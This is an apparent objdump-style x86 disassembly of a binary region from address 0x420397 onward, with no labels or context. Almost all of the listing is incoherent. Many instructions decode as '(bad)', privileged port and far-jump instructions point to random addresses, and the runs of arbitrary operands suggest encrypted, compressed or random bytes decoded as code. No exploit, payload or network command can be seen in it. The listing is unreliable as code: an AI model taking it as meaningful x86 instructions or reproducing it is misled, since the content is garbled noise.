  420397:	xchg   edi,eax
  420398:	fmul   QWORD PTR [edx]
  42039a:	(bad)  
  42039b:	jl     0x4203ce
  42039d:	lds    edi,FWORD PTR [ebx*8-0x6b3004d6]
  4203a4:	jmp    0x4203ca
  4203a6:	(bad)  
  4203a7:	stc    
  4203a8:	cmp    al,0xb9
  4203aa:	mov    ds:0x2e9765a3,al
  4203af:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4203b1:	jp     0x420415
  4203b3:	(bad)  
  4203b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203b5:	pop    ss
  4203b6:	inc    esp
  4203b7:	push   edx
  4203b8:	xchg   edx,eax
  4203b9:	xor    DWORD PTR [edi-0x61],ecx
  4203bc:	sub    ch,ah
  4203be:	mov    BYTE PTR [ebx],bh
  4203c0:	dec    ch
  4203c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203c3:	push   0x4a5ea289
  4203c8:	cmc    
  4203c9:	adc    al,0xa3
  4203cb:	xor    bl,BYTE PTR [esi+edx*8+0x18]
  4203cf:	jl     0x420415
  4203d1:	cs retf 0x5429
  4203d5:	cmp    DWORD PTR [ebx-0x4d34aaba],esi
  4203db:	pop    ss
  4203dc:	sbb    cl,0x5c
  4203df:	test   eax,0xa26b0903
  4203e4:	sub    cl,ch
  4203e6:	sbb    ah,BYTE PTR [ebx+0x46f3cd0f]
  4203ec:	xchg   ecx,eax
  4203ed:	inc    ebp
  4203ee:	xlat   BYTE PTR ds:[ebx]
  4203ef:	or     ch,bh
  4203f1:	xor    al,cl
  4203f3:	sbb    al,0x10
  4203f5:	or     BYTE PTR [edi-0x31],0x76
  4203f9:	sahf   
  4203fa:	pop    esi
  4203fb:	jno    0x4203f2
  4203fd:	xor    ebx,DWORD PTR [eax-0x22]
  420400:	stc    
  420401:	pushf  
  420402:	in     al,dx
  420403:	xor    eax,0xffffff9c
  420406:	ja     0x4203a1
  420408:	push   esi
  420409:	push   es
  42040a:	dec    dl
  42040c:	pop    esi
  42040d:	je     0x42043f
  42040f:	(bad)  
  420410:	cdq    
  420411:	xchg   edi,eax
  420412:	xor    esp,edi
  420414:	popf   
  420415:	and    ecx,edx
  420417:	pop    ss
  420418:	aam    0x92
  42041a:	xor    eax,0xd2edcaa8
  42041f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420420:	std    
  420421:	mov    al,ds:0x586c92fe
  420426:	mov    ebx,0xe430daf2
  42042b:	loop   0x42043d
  42042d:	push   es
  42042e:	push   ds
  42042f:	cdq    
  420430:	sbb    al,0x5e
  420432:	pop    ebp
  420433:	fwait
  420434:	jb     0x420457
  420436:	pusha  
  420437:	xchg   esp,eax
  420438:	jns    0x4203f2
  42043a:	mov    eax,0xcf6f0cea
  42043f:	(bad)  
  420440:	and    esp,DWORD PTR [ecx]
  420442:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420443:	retf   
  420444:	sbb    eax,0x9584a202
  420449:	dec    ebp
  42044a:	xor    al,0x1a
  42044c:	js     0x420491
  42044e:	jmp    0x420481
  420450:	rcl    BYTE PTR [esi+0xe],1
  420453:	aas    
  420454:	leave  
  420455:	lods   eax,DWORD PTR ds:[esi]
  420456:	adc    dl,bl
  420458:	fs add eax,0x3c6b5b69
  42045e:	fwait
  42045f:	js     0x42042b
  420461:	adc    cl,bh
  420463:	pop    DWORD PTR [esi-0xc]
  420466:	scas   eax,DWORD PTR es:[edi]
  420467:	mov    eax,0xf2559601
  42046c:	retf   
  42046d:	mov    ebx,0xf5273d58
  420472:	stos   BYTE PTR es:[edi],al
  420473:	mov    dh,0x30
  420475:	dec    ecx
  420476:	cmp    BYTE PTR [edi+esi*1+0x2f],al
  42047a:	xchg   esp,eax
  42047b:	cdq    
  42047c:	xchg   BYTE PTR [ecx-0x4de3e3ac],bh
  420482:	jmp    0x42043f
  420484:	pop    ss
  420485:	lods   eax,DWORD PTR ds:[esi]
  420486:	fsubr  st,st(4)
  420488:	imul   ebp,DWORD PTR [eax-0x4b],0xb242c4cb
  42048f:	add    eax,DWORD PTR [eax]
	...
  4204f1:	add    BYTE PTR [eax],al
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	cld    
  420501:	aad    0xe
  420503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420504:	in     al,dx
  420505:	push   edi
  420506:	add    DWORD PTR [eax],eax
  420508:	add    al,0x1
  42050a:	add    BYTE PTR [eax],al
  42050c:	push   ebp
  42050d:	mov    bh,BYTE PTR [eax+0xe]
  420510:	daa    
  420511:	ds adc eax,0x1e3f369e
  420517:	mov    al,0x29
  420519:	mov    edx,ebp
  42051b:	cmc    
  42051c:	fmulp  st(5),st
  42051e:	rol    BYTE PTR [esi-0x50],1
  420521:	jnp    0x420548
  420523:	outs   dx,DWORD PTR ds:[esi]
  420524:	adc    al,0xeb
  420526:	int3   
  420527:	push   ebx
  420528:	push   edi
  420529:	mov    bl,0x54
  42052b:	les    edx,FWORD PTR [edx+eax*8-0x133d410f]
  420532:	push   ecx
  420533:	setge  BYTE PTR [edx]
  420536:	or     eax,0x411f9c1
  42053b:	hlt    
  42053c:	aaa    
  42053d:	cmc    
  42053e:	push   ebp
  42053f:	xchg   esi,eax
  420540:	jmp    0x29168e0
  420545:	(bad)
  42054a:	les    edi,FWORD PTR [ebx]
  42054c:	sbb    bl,cl
  42054e:	xchg   BYTE PTR [edi],bl
  420550:	stc    
  420551:	repz sbb eax,0x7d990af7
  420557:	sbb    DWORD PTR [esi],edi
  420559:	in     eax,dx
  42055a:	cmc    
  42055b:	je     0x4205cb
  42055d:	outs   dx,DWORD PTR ds:[esi]
  42055e:	call   FWORD PTR ds:0x65cc3884
  420564:	or     eax,esi
  420566:	cld    
  420567:	dec    edi
  420568:	jns    0x42059b
  42056a:	outs   dx,DWORD PTR ds:[esi]
  42056b:	ins    DWORD PTR es:[edi],dx
  42056c:	xor    al,0x69
  42056e:	inc    esp
  42056f:	inc    edi
  420570:	clc    
  420571:	scas   eax,DWORD PTR es:[edi]
  420572:	mov    al,ds:0x7eb40add
  420577:	sub    DWORD PTR [edi+ebp*1+0x48],edx
  42057b:	mov    eax,ds:0x304fe3e
  420580:	inc    ebp
  420581:	mov    bl,0x15
  420583:	add    eax,0x9db9fabe
  420588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420589:	push   ebx
  42058a:	stos   DWORD PTR es:[edi],eax
  42058b:	mov    dl,0x69
  42058d:	je     0x420555
  42058f:	in     eax,dx
  420590:	sbb    edx,DWORD PTR [eax-0x61]
  420593:	lahf   
  420594:	not    DWORD PTR [ebx-0x7658a3ff]
  42059a:	out    0x90,eax
  42059c:	pop    ds
  42059d:	int    0x73
  42059f:	pop    ss
  4205a0:	jb     0x42057f
  4205a2:	jl     0x420571
  4205a4:	outs   dx,DWORD PTR ds:[esi]
  4205a5:	and    al,0xbf
  4205a7:	lahf   
  4205a8:	xor    DWORD PTR [eax-0x10a619c1],0x49a0614d
  4205b2:	lods   al,BYTE PTR ds:[esi]
  4205b3:	in     eax,dx
  4205b4:	mov    cl,0x80
  4205b6:	(bad)  
  4205b8:	mov    ebx,DWORD PTR [edx+0x35]
  4205bb:	or     eax,DWORD PTR [edi]
  4205bd:	je     0x4205b3
  4205bf:	or     eax,0x778ed4cd
  4205c4:	icebp  
  4205c5:	push   0xffffffb2
  4205c7:	iret   
  4205c8:	sbb    cl,dl
  4205ca:	mov    ds:0xa3c8963f,al
  4205cf:	iret   
  4205d0:	dec    esp
  4205d1:	add    cl,BYTE PTR [edi]
  4205d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205d4:	sbb    BYTE PTR [ebp-0x2b],al
  4205d7:	xor    eax,0x81b40a7a
  4205dc:	outs   dx,DWORD PTR ds:[esi]
  4205dd:	xchg   edx,eax
  4205de:	lea    ebx,[esp+ecx*1+0x56]
  4205e2:	add    BYTE PTR [ecx+0xf],cl
  4205e5:	cmp    al,0xbd
  4205e7:	test   BYTE PTR [esi-0x34d2be74],ch
  4205ed:	call   0x4abad546
  4205f2:	dec    esp
  4205f3:	enter  0x120a,0xb9
  4205f7:	jnp    0x4205dd
  4205f9:	sub    ch,BYTE PTR [edi]
  4205fb:	and    BYTE PTR [ecx+0x46],ch
  4205fe:	ret    
  4205ff:	cmp    cl,BYTE PTR [edi+0x23]
  420602:	outs   dx,BYTE PTR ds:[esi]
  420603:	pop    esi
  420604:	jno    0x420658
  420606:	enter  0x4c78,0x57
  42060a:	adc    BYTE PTR [ebx-0x1a456acd],0x0
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	retf   0x62e0
  420683:	pusha  
  420684:	lock pop eax
  420686:	add    DWORD PTR [eax],eax
  420688:	add    al,0x1
  42068a:	add    BYTE PTR [eax],al
  42068c:	or     DWORD PTR [ecx+0x603045b3],edx
  420692:	or     eax,0xac17df1a
  420697:	sub    al,0x24
  420699:	enter  0x1ccf,0xbe
  42069d:	dec    esi
  42069e:	push   esp
  42069f:	les    ecx,FWORD PTR [ecx+ebx*2+0x64]
  4206a3:	push   cs
  4206a4:	in     al,dx
  4206a5:	adc    dl,BYTE PTR gs:[edx+0x14]
  4206a9:	fcmovb st,st(3)
  4206ab:	mov    ebp,0x5da12eaf
  4206b0:	xchg   DWORD PTR [ecx],ebx
  4206b2:	jmp    0x70bae33b
  4206b7:	pop    ebx
  4206b8:	sbb    al,0x2f
  4206ba:	xlat   BYTE PTR ds:[ebx]
  4206bb:	stos   DWORD PTR es:[edi],eax
  4206bc:	icebp  
  4206bd:	or     al,0x6d
  4206bf:	jecxz  0x420669
  4206c1:	fisub  DWORD PTR [edi+0x60]
  4206c4:	inc    ecx
  4206c5:	xchg   ebx,eax
  4206c6:	fsubr  QWORD PTR [ebx-0x71]
  4206c9:	cmp    edi,DWORD PTR [eax]
  4206cb:	pop    esp
  4206cc:	lea    esp,[esi-0x46]
  4206cf:	ss pop esp
  4206d1:	jl     0x4206cf
  4206d3:	jle    0x42067d
  4206d5:	jb     0x420704
  4206d7:	push   ebx
  4206d8:	sub    bh,BYTE PTR [edi]
  4206da:	mov    gs,WORD PTR [edx-0x1d8f759e]
  4206e0:	mov    DWORD PTR fs:[ecx+0xdf0828],esp
  4206e7:	dec    ecx
  4206e8:	ins    BYTE PTR es:[edi],dx
  4206e9:	out    dx,al
  4206ea:	push   edx
  4206eb:	mov    eax,ds:0x9aa3abc7
  4206f0:	test   BYTE PTR [edi-0x5d752c27],bl
  4206f6:	or     eax,0x4b4ff49f
  4206fb:	pop    edx
  4206fc:	mov    al,0x7c
  4206fe:	adc    eax,0xc745455a
  420703:	je     0x4206ca
  420705:	pop    ss
  420706:	stos   DWORD PTR es:[edi],eax
  420707:	addr16 retf 
  420709:	(bad)  
  42070a:	out    0xd9,al
  42070c:	sub    eax,esi
  42070e:	aam    0xc9
  420710:	adc    DWORD PTR [ebp+0x30993788],0x7158b221
  42071a:	and    al,0x16
  42071c:	mov    esp,0xdd77921
  420721:	mov    BYTE PTR [edi],ah
  420723:	sub    dl,0x6b
  420726:	(bad)  
  420727:	arpl   WORD PTR [bp+di],dx
  42072a:	sahf   
  42072b:	test   DWORD PTR [eax],eax
  42072d:	fadd   st(0),st
  42072f:	shl    esi,1
  420731:	mov    dl,0xcf
  420733:	cli    
  420734:	mul    BYTE PTR [eax-0x40]
  420737:	dec    edx
  420738:	cmp    eax,0x6eabb0bc
  42073d:	bound  edi,QWORD PTR [edi]
  42073f:	inc    ebp
  420740:	inc    ecx
  420741:	cmp    DWORD PTR [edx+0x26],edi
  420744:	neg    si
  420747:	jmp    0xf425dc
  42074c:	mov    cl,0x1f
  42074e:	outs   dx,BYTE PTR ds:[esi]
  42074f:	das    
  420750:	enter  0x658,0x56
  420754:	loop   0x42076f
  420756:	jge    0x4206fc
  420758:	aam    0xd8
  42075a:	mov    ch,0x62
  42075c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42075d:	in     al,0x42
  42075f:	inc    edx
  420760:	and    dl,BYTE PTR [eax-0x77]
  420763:	rcr    ah,1
  420765:	stos   DWORD PTR es:[edi],eax
  420766:	mov    edi,0x3121ccb9
  42076b:	repz xchg esi,ebp
  42076e:	adc    eax,0xbda10d92
  420773:	jae    0x420762
  420775:	out    0x85,al
  420777:	loop   0x420756
  420779:	fwait
  42077a:	ret    
  42077b:	push   ss
  42077c:	jno    0x4207c8
  42077e:	inc    edi
  42077f:	sub    ebp,DWORD PTR [eax]
  420781:	out    dx,al
  420782:	arpl   WORD PTR [ebx],bx
  420784:	aad    0xea
  420786:	or     eax,edi
  420788:	(bad)  
  420789:	sahf   
  42078a:	push   0x5c449019
  42078f:	scas   eax,DWORD PTR es:[edi]
	...
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420801:	inc    ebp
  420802:	dec    ebx
  420803:	push   ebx
  420804:	hlt    
  420805:	pop    ecx
  420806:	add    DWORD PTR [eax],eax
  420808:	add    al,0x1
  42080a:	add    BYTE PTR [eax],al
  42080c:	pop    eax
  42080d:	mov    ecx,0x5f81b1f2
  420812:	sub    esp,DWORD PTR [edx+eax*4+0x16128f3f]
  420819:	cld    
  42081a:	jnp    0x4207fb
  42081c:	lea    edi,[ebp-0x59]
  42081f:	ds mov ebx,0x450d8c7b
  420825:	sbb    cl,bh
  420827:	loop   0x420898
  420829:	loopne 0x4207bc
  42082b:	gs xor eax,0xfc7af4c9
  420831:	push   edi
  420832:	mov    dl,0x42
  420834:	rol    DWORD PTR [ecx+0x2e868da0],1
  42083a:	repz aas 
  42083c:	add    bh,BYTE PTR ds:0x61b1bc3d
  420842:	pop    ebp
  420843:	shl    DWORD PTR [edx],0x4c
  420846:	inc    esp
  420847:	jge    0x420878
  420849:	fadd   QWORD PTR [edi]
  42084b:	retf   
  42084c:	fadd   DWORD PTR [ebp+0x1a]
  42084f:	into   
  420850:	lahf   
  420851:	jnp    0x4207f6
  420853:	popw   ds
  420855:	iret   
  420856:	lock stos DWORD PTR es:[edi],eax
  420858:	stos   BYTE PTR es:[edi],al
  420859:	adc    dh,bh
  42085b:	push   ds
  42085c:	div    DWORD PTR [ecx-0xed8abb8]
  420862:	stc    
  420863:	push   0xd0afcb36
  420868:	add    dl,BYTE PTR [ecx]
  42086a:	cli    
  42086b:	leave  
  42086c:	mov    eax,ds:0x841d420d
  420871:	mov    BYTE PTR [edx-0x6],ch
  420874:	(bad)  
  420875:	ds nop
  420877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420878:	sub    eax,0xedc7546f
  42087d:	dec    ebx
  42087e:	aam    0x34
  420880:	adc    BYTE PTR [esi-0x1fcce8be],ah
  420886:	jle    0x420843
  420888:	retf   0x9399
  42088b:	pop    edx
  42088c:	imul   dl
  42088e:	fiadd  DWORD PTR [ebx+0x2f]
  420891:	add    BYTE PTR [esi-0x4326bdf8],cl
  420897:	les    eax,FWORD PTR [ebx-0x4498938]
  42089d:	add    DWORD PTR [eax-0x698aa1ef],0xfffffffa
  4208a4:	and    ebp,ebp
  4208a6:	arpl   WORD PTR [ecx],ax
  4208a8:	cli    
  4208a9:	retf   0x8b96
  4208ac:	mov    ch,0xe
  4208ae:	jmp    0x2e18:0x8707b811
  4208b5:	inc    esi
  4208b6:	aas    
  4208b7:	mov    ds:0xe110d70f,al
  4208bc:	int    0x6f
  4208be:	sub    ah,0xfb
  4208c1:	push   ebp
  4208c2:	lods   al,BYTE PTR ds:[esi]
  4208c3:	sub    ebp,eax
  4208c5:	inc    eax
  4208c6:	repz push esp
  4208c8:	cmp    eax,0xe2a4cfa2
  4208cd:	gs push ebp
  4208cf:	fwait
  4208d0:	sub    edx,0xffffff91
  4208d3:	scas   al,BYTE PTR es:[edi]
  4208d4:	xchg   ebx,eax
  4208d5:	mov    eax,ds:0xd28be921
  4208da:	and    al,0xc7
  4208dc:	ins    BYTE PTR es:[edi],dx
  4208dd:	fsub   DWORD PTR [esi-0x39]
  4208e0:	xchg   esp,eax
  4208e1:	stos   BYTE PTR es:[edi],al
  4208e2:	cmp    al,BYTE PTR [edi]
  4208e4:	bnd jne 0x4208b2
  4208e7:	jle    0x420878
  4208e9:	and    al,0xe2
  4208eb:	mov    ds:0xf475e364,eax
  4208f0:	dec    DWORD PTR [ebp+0x363623cb]
  4208f6:	sbb    edx,esp
  4208f8:	pop    ebp
  4208f9:	and    al,0x3c
  4208fb:	test   eax,0x3fda32c9
  420900:	mov    edi,0xf9e5320f
  420905:	arpl   WORD PTR [edi-0x68],dx
  420908:	dec    ebp
  420909:	retf   
  42090a:	sti    
  42090b:	or     esp,esi
  42090d:	mov    bh,0x1f
  42090f:	sahf   
	...
  420974:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xc3
  420981:	inc    esi
  420982:	out    0x8c,eax
  420984:	clc    
  420985:	pop    edx
  420986:	add    DWORD PTR [eax],eax
  420988:	add    al,0x1
  42098a:	add    BYTE PTR [eax],al
  42098c:	clc    
  42098d:	out    dx,eax
  42098e:	xchg   ecx,eax
  42098f:	mov    WORD PTR ds:[esi+0x60],es
  420993:	scas   al,BYTE PTR es:[edi]
  420994:	inc    ebp
  420995:	and    DWORD PTR [ebx],ebx
  420997:	jbe    0x4209fb
  420999:	push   ds
  42099a:	add    eax,esi
  42099c:	xor    edx,esp
  42099e:	inc    ebx
  42099f:	cli    
  4209a0:	stc    
  4209a1:	fdivr  DWORD PTR [edi+0x4067b7a1]
  4209a7:	cs fs cs adc eax,0x5fbfc86
  4209af:	fidiv  WORD PTR [edx-0x70]
  4209b2:	popa   
  4209b3:	inc    ecx
  4209b4:	(bad)  
  4209b5:	rol    ebx,cl
  4209b7:	sub    al,0xe5
  4209b9:	scas   eax,DWORD PTR es:[edi]
  4209ba:	jl     0x42095a
  4209bc:	lock shl BYTE PTR [ecx],0x51
  4209c0:	dec    eax
  4209c1:	sbb    DWORD PTR [eax-0x5a],0xffffffcf
  4209c5:	mov    esi,0x1525ab77
  4209ca:	ret    0x8b51
  4209cd:	inc    esi
  4209ce:	jns    0x420971
  4209d0:	daa    
  4209d1:	xor    BYTE PTR [eax+0xb],dl
  4209d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209d5:	mov    ch,cl
  4209d7:	retf   
  4209d8:	mov    esi,0xa8153a53
  4209dd:	pop    esi
  4209de:	jge    0x420a22
  4209e0:	adc    al,0x3a
  4209e2:	addr16 jge 0x42097e
  4209e5:	loopne 0x420a52
  4209e7:	mov    bl,0xc8
  4209e9:	call   0x99e1afd6
  4209ee:	inc    esp
  4209ef:	inc    ecx
  4209f0:	mov    esp,0x55101dcc
  4209f5:	xor    edi,DWORD PTR [ebp+edx*1+0x44]
  4209f9:	adc    esp,DWORD PTR [ebx-0x343c04cb]
  4209ff:	dec    ebx
  420a00:	push   ds
  420a01:	push   ds
  420a02:	mov    esi,0x3770dffe
  420a07:	(bad)  
  420a08:	mov    eax,ds:0x7a8e233c
  420a0d:	mov    ecx,0xc2d6f59c
  420a12:	push   esp
  420a13:	in     eax,0x54
  420a15:	add    eax,0x9bc57bf0
  420a1a:	adc    BYTE PTR [edi-0x48b7aa30],al
  420a20:	mov    ds:0x9deba8d0,al
  420a25:	jp     0x420a15
  420a27:	xchg   ebx,eax
  420a28:	jmp    0x2536:0xd749c28d
  420a2f:	mov    eax,0x6ef40ae
  420a34:	jg     0x420a56
  420a36:	(bad)  [ebp+0x2c]
  420a39:	mov    ds:0xeaddc190,eax
  420a3e:	mov    edx,0xb9630fb
  420a43:	repz repnz sub eax,0xcdd82ada
  420a4a:	sbb    dh,BYTE PTR fs:[esi]
  420a4d:	add    DWORD PTR ds:0x3effb06,ecx
  420a53:	imul   esi,DWORD PTR [edi+0x64],0x32
  420a57:	lock or ebx,esi
  420a5a:	arpl   WORD PTR [eax],ax
  420a5c:	scas   al,BYTE PTR es:[edi]
  420a5d:	pop    ss
  420a5e:	pop    ds
  420a5f:	mov    eax,ds:0xe5d91e60
  420a64:	and    DWORD PTR [ebx+0x50bc8da2],esi
  420a6a:	cmp    BYTE PTR [eax-0x3],ah
  420a6d:	dec    ebx
  420a6e:	and    ecx,DWORD PTR [esi-0x1de7e6f2]
  420a74:	xchg   DWORD PTR [esi+eiz*8],ebp
  420a77:	xchg   ebx,eax
  420a78:	jmp    0x7daa:0x86a1f2e9
  420a7f:	cmp    edi,DWORD PTR [edi]
  420a81:	inc    ebx
  420a82:	mov    al,ds:0x8f5dc8d9
  420a87:	addr16 push ebp
  420a89:	mov    ecx,0x54ceebd3
  420a8e:	(bad)  ds:0x0
	...
  420af4:	fbstp  TBYTE PTR [edx]
  420af6:	scas   eax,DWORD PTR es:[edi]
  420af7:	adc    ebp,edi
  420af9:	lahf   
  420afa:	(bad)  
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	(bad)  
  420b01:	ins    DWORD PTR es:[edi],dx
  420b02:	enter  0xfc95,0x5b
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    al,0x1
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	shl    DWORD PTR [eax+eiz*2],1
  420b0f:	xor    al,0x55
  420b11:	dec    ebx
  420b12:	cmp    DWORD PTR [ebp+0x160e73e8],ebx
  420b18:	push   eax
  420b19:	fidiv  DWORD PTR [edi-0x2d]
  420b1c:	lds    ebx,FWORD PTR [ebp+0x43a83daa]
  420b22:	mov    ds:0xb55a6311,eax
  420b27:	bound  edi,QWORD PTR [eax+0x62]
  420b2a:	mov    WORD PTR [ebx+0x7f],ss
  420b2d:	sar    eax,1
  420b2f:	and    ebp,DWORD PTR ds:0xf212762d
  420b35:	neg    DWORD PTR ds:0x1a047d69
  420b3b:	pop    ds
  420b3c:	sbb    al,0xde
  420b3e:	mov    eax,ds:0xbaf7c7ce
  420b43:	push   esi
  420b44:	jmp    0x420ad9
  420b46:	fsub   DWORD PTR [eax-0x70]
  420b49:	test   eax,0xc83b0bd7
  420b4e:	ficomp WORD PTR [ebx+0x224ae64b]
  420b54:	fisubr DWORD PTR gs:[edx+0x60]
  420b58:	fcom   QWORD PTR [eax]
  420b5a:	clc    
  420b5b:	fdiv   QWORD PTR [edi]
  420b5d:	mov    bl,0x2c
  420b5f:	dec    eax
  420b60:	add    al,0x2b
  420b62:	mov    ecx,DWORD PTR [ebx+0x75]
  420b65:	mov    ch,BYTE PTR [ebx]
  420b67:	push   ebp
  420b68:	rcl    BYTE PTR [ebp+ebp*4+0x13cc549f],0x25
  420b70:	test   al,0xf7
  420b72:	dec    ebx
  420b73:	mov    ebx,0x30528867
  420b78:	push   esi
  420b79:	push   ds
  420b7a:	or     DWORD PTR [ebp+0x68],0xffffff8f
  420b7e:	(bad)  
  420b7f:	and    DWORD PTR [eax+0x10899dfb],esp
  420b85:	add    ebx,eax
  420b87:	(bad)  
  420b88:	xchg   esp,eax
  420b89:	pop    edx
  420b8a:	and    DWORD PTR [ebp+edx*2-0x470e0cee],edi
  420b91:	xor    eax,0xf0dbee43
  420b96:	add    edi,DWORD PTR [eax-0x2a1bc1d1]
  420b9c:	push   cs
  420b9d:	sub    eax,0x3928310
  420ba2:	jno    0x420c1b
  420ba4:	push   ecx
  420ba5:	sub    ah,BYTE PTR [esp+esi*1-0x80]
  420ba9:	and    ebx,ecx
  420bab:	mov    bh,bl
  420bad:	ror    al,cl
  420baf:	xchg   edi,eax
  420bb0:	pushf  
  420bb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bb2:	push   eax
  420bb3:	mov    ds:0xc1cfda65,al
  420bb8:	jae    0x420c09
  420bba:	xchg   ecx,eax
  420bbb:	out    dx,eax
  420bbc:	fsubr  QWORD PTR [ebx+0x5932c061]
  420bc2:	es fcmove st,st(1)
  420bc5:	cmc    
  420bc6:	jge    0x420b8b
  420bc8:	pushf  
  420bc9:	les    esp,FWORD PTR [esi+0x1f]
  420bcc:	popf   
  420bcd:	push   edx
  420bce:	push   esp
  420bcf:	pop    edi
  420bd0:	pop    ss
  420bd1:	retf   
  420bd2:	std    
  420bd3:	xor    dh,BYTE PTR [ebp+0x70]
  420bd6:	repz mov dh,0x18
  420bd9:	cmp    eax,0x29aebb53
  420bde:	sub    BYTE PTR [edx],ch
  420be0:	mov    esi,0x1953a65c
  420be5:	js     0x420bc8
  420be7:	mov    edx,0x2cfa019e
  420bec:	loop   0x420c5f
  420bee:	push   edx
  420bef:	mov    al,0x25
  420bf1:	mov    ds:0xf035f7dc,al
  420bf6:	fcomi  st,st(1)
  420bf8:	fiadd  WORD PTR [edi+0x7]
  420bfb:	push   0x838b5407
  420c00:	sub    ch,BYTE PTR [edi]
  420c02:	dec    edi
  420c03:	aam    0xb0
  420c05:	js     0x420c73
  420c07:	or     DWORD PTR [ecx+edx*4],ecx
  420c0a:	int3   
  420c0b:	add    al,BYTE PTR [esi]
  420c0d:	mov    ebx,0xf690
	...
  420c72:	add    BYTE PTR [eax],al
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0x2c
  420c81:	sti    
  420c82:	pop    es
  420c83:	stc    
  420c84:	add    BYTE PTR [ebp+0x1],bl
  420c87:	add    BYTE PTR [ecx+eax*1],al
  420c8a:	add    BYTE PTR [eax],al
  420c8c:	jge    0x420cba
  420c8e:	popa   
  420c8f:	or     DWORD PTR [eax],0x49
  420c92:	jge    0x420c79
  420c94:	scas   al,BYTE PTR es:[edi]
  420c95:	outs   dx,BYTE PTR ds:[esi]
  420c96:	inc    eax
  420c97:	je     0x420c41
  420c99:	ja     0x420cfe
  420c9b:	fnsave [ebx+0x54ef81]
  420ca1:	fwait
  420ca2:	dec    eax
  420ca3:	test   eax,0x6489d2fc
  420ca8:	and    cl,BYTE PTR [edi]
  420caa:	cmp    BYTE PTR [edi+0x4],ah
  420cad:	pop    edx
  420cae:	sbb    dl,BYTE PTR [ebx]
  420cb0:	lahf   
  420cb1:	dec    ebp
  420cb2:	jo     0x420cb9
  420cb4:	inc    eax
  420cb5:	fsub   DWORD PTR [ebx]
  420cb7:	jmp    0xda4c:0xcbb0556e
  420cbe:	sub    cl,BYTE PTR [esi-0x7161ae73]
  420cc4:	pop    ss
  420cc5:	or     edi,DWORD PTR [ebp+0x4c]
  420cc8:	stos   DWORD PTR es:[edi],eax
  420cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cca:	dec    ebx
  420ccb:	mov    DWORD PTR [ebx+0x65],ebx
  420cce:	xchg   esp,eax
  420ccf:	out    dx,al
  420cd0:	adc    esi,DWORD PTR [ecx+0x3d930c63]
  420cd6:	(bad)  
  420cd7:	lock test DWORD PTR [edi+ebp*1-0x76],0xc498ff38
  420ce0:	retf   
  420ce1:	and    DWORD PTR [eax+0x2e],0xffffffd9
  420ce5:	mov    bl,0x93
  420ce7:	sar    BYTE PTR [esi-0x29],0x94
  420ceb:	xchg   esi,eax
  420cec:	pop    edx
  420ced:	mov    esi,0x148f12cf
  420cf2:	test   BYTE PTR ds:0x251c81cb,bl
  420cf8:	xchg   esi,eax
  420cf9:	sub    eax,0x6fed837f
  420cfe:	arpl   WORD PTR [edi],dx
  420d00:	loope  0x420d7b
  420d02:	sbb    eax,0x99eb4cc6
  420d07:	inc    esi
  420d08:	jb     0x420d2e
  420d0a:	rcl    BYTE PTR ds:0x1334ca49,0x6c
  420d11:	dec    ebp
  420d12:	push   ebp
  420d13:	cmp    DWORD PTR ss:[ebx],ebx
  420d16:	mov    dl,0xa9
  420d18:	jo     0x420d56
  420d1a:	pushf  
  420d1b:	pushf  
  420d1c:	xchg   DWORD PTR [edi-0x1486de89],esp
  420d22:	pop    ss
  420d23:	sbb    ah,ah
  420d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d26:	ret    
  420d27:	sbb    ecx,esi
  420d29:	into   
  420d2a:	xchg   esi,eax
  420d2b:	adc    al,0x74
  420d2d:	jmp    0xdacf:0xe8331390
  420d34:	lds    esi,FWORD PTR ds:0x40761304
  420d3a:	and    BYTE PTR [ebp-0x19],bh
  420d3d:	and    cl,BYTE PTR [edx]
  420d3f:	mov    dl,0xac
  420d41:	inc    ebx
  420d42:	adc    eax,0xad9c874c
  420d47:	jmp    0xf5eb632f
  420d4c:	sahf   
  420d4d:	inc    ebp
  420d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d4f:	je     0x420ced
  420d51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d52:	fisttp DWORD PTR [ecx+0xc]
  420d55:	mov    ecx,0x99d022d3
  420d5a:	adc    edi,eax
  420d5c:	fldenv [ecx-0x7]
  420d5f:	cld    
  420d60:	cdq    
  420d61:	and    bh,0x8f
  420d64:	and    BYTE PTR [ebx+0x56],ch
  420d67:	xchg   ecx,eax
  420d68:	repz daa 
  420d6a:	add    al,0x12
  420d6c:	shl    BYTE PTR [ebx-0x28748ff7],cl
  420d72:	enter  0x6de1,0xcf
  420d76:	aad    0x61
  420d78:	ins    DWORD PTR es:[edi],dx
